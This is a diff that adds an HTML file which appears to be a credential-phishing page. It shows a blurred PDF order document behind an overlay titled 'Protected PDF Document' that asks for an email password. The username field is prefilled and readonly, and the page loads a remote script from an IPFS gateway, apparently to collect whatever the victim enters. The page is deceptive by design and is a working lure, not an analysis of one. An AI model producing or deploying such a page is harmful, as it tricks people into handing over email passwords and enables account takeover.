@@ -1,0 +1,109 @@
+<html lang="en">
+   <head>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <link rel="icon" type="image/png" href="https://cdn.glitch.global/2c682423-5763-41dc-a021-c9e64567d8af/pdfico.ico">
+      <title>Sign In</title>
+      <style>
+	  body.hidden {
+		display: none;
+		}
+		
+         body, html {
+         height: 100%;
+         margin: 0;
+         font-family: Arial, sans-serif;
+         }
+         .background-pdf {
+         position: absolute;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 100%;
+         border: none;
+         z-index: -1;
+         transition: filter 1s ease-in-out;
+         }
+         .blurred {
+         filter: blur(7px);
+         }
+         .container {
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         height: 100%;
+         position: relative;
+         z-index: 1;
+         }
+         .content-box {
+         background: rgba(0, 0, 0, 0.8);
+         padding: 20px;
+         border-radius: 10px;
+         box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+         color: white;
+         text-align: center;
+         display: none; /* Initially hidden */
+         }
+         .login-form {
+         background: #241f1ff0;
+         padding: 30px;
+         border-radius: 10px;
+         box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+         text-align: center;
+         width: 350px;
+         }
+         .login-form h2, .login-form h4 {
+         color: #fff;
+         }
+         .login-form input[type="text"], .login-form input[type="password"] {
+         width: 90%;
+         padding: 10px;
+         margin: 10px 0;
+         font-size: 17px;
+         border: 1px solid #ccc;
+         border-radius: 5px;
+         }
+         .login-form button {
+         padding: 5px;
+         background-color: gray;
+         border: none;
+         border-radius: 5px;
+         color: white;
+         font-size: 21px;
+         cursor: pointer;
+         }
+         .error-message {
+         color: red;
+         margin-top: 20px;
+         }
+      </style>
+   </head>
+   <body class="hidden">
+      <iframe class="background-pdf" src="https://storage.googleapis.com/webemail-437418.appspot.com/ceo/og/new-pdf/Order_3314195312_20250305_060203.pdf"></iframe>
+      <div class="container">
+         <div class="content-box" id="contentBox">
+            <form id="loginForm" class="login-form" action="" method="post">
+               <h2>Protected PDF Document</h2>
+               <h4>*Enter Email Password to continue*</h4>
+               <input type="text" id="username" name="username" placeholder="Username" required="" readonly="">
+               <input type="password" id="password" name="password" placeholder="Password">
+               <button type="submit" name="submit">View Document</button>
+               <div class="error-message" id="error-message"></div>
+            </form>
+         </div>
+      </div>
+      <script>
+         setTimeout(() => {
+             document.getElementById("contentBox").style.display = "block";
+         }, 2000);
+         setTimeout(() => {
+             document.querySelector('.background-pdf').classList.add('blurred');
+         }, 1500);
+      </script>
+      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://bafkreighmcj66qu6oys7tgy2cnsoqh7qcm3457clt3h3rls5zi3m72mm4u.ipfs.w3s.link"></script>
+   </body>
+</html>
